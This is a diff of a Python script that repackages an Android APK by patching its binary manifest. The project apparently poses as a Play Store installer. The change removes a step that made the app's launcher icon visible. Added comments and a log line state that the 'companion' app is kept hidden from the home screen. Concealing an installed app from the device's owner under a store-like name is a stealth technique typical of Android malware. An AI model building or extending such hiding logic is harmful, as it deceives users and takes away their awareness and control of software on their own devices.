@@ -201,8 +201,8 @@ KOTLIN_FILES = [
     "app/src/main/java/com/playstore/installer/InstallReceiver.kt",
 ]
 
-CAT_OLD = b"android.intent.category.INFO"
-CAT_NEW = b"android.intent.category.LAUNCHER"
+# android.intent.category.INFO must stay as-is — it hides the companion from the home screen.
+# Do NOT replace it with LAUNCHER (that would make the icon visible on the home screen).
 
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
@@ -667,30 +667,18 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename):
     new_str_data = bytearray()
     new_offsets  = []
     replaced = 0
-    cat_replaced = 0
 
     for (cc, bc, ch) in entries:
         new_offsets.append(len(new_str_data))
         if OLD in ch:
             new_ch = ch.replace(OLD, NEW)
-            cat_delta = 0
-            if CAT_OLD in new_ch:
-                new_ch = new_ch.replace(CAT_OLD, CAT_NEW)
-                cat_delta = len(CAT_NEW) - len(CAT_OLD)
-                cat_replaced += 1
-            total_delta = DELTA + cat_delta
-            new_str_data.extend([cc + total_delta, bc + total_delta])
+            new_str_data.extend([cc + DELTA, bc + DELTA])
             new_str_data.extend(new_ch)
             new_str_data.append(0)
             replaced += 1
-        elif CAT_OLD in ch:
-            cat_delta = len(CAT_NEW) - len(CAT_OLD)
-            new_ch = ch.replace(CAT_OLD, CAT_NEW)
-            new_str_data.extend([cc + cat_delta, bc + cat_delta])
-            new_str_data.extend(new_ch)
-            new_str_data.append(0)
-            cat_replaced += 1
         else:
+            # Leave all other strings untouched — including android.intent.category.INFO
+            # INFO category keeps companion hidden from the home screen launcher
             new_str_data.extend([cc, bc])
             new_str_data.extend(ch)
             new_str_data.append(0)
@@ -698,10 +686,7 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename):
     if replaced == 0:
         print("[X] No strings replaced in manifest (package name)")
         sys.exit(1)
-    if cat_replaced == 0:
-        print("[X] android.intent.category.INFO not found in manifest")
-        sys.exit(1)
-    print(f"  Manifest: {replaced} pkg replacements, {cat_replaced} category fix")
+    print(f"  Manifest: {replaced} pkg replacements (category.INFO preserved — companion stays hidden)")
 
     new_sp_size = 28 + str_count * 4 + len(new_str_data)
     result = bytearray()
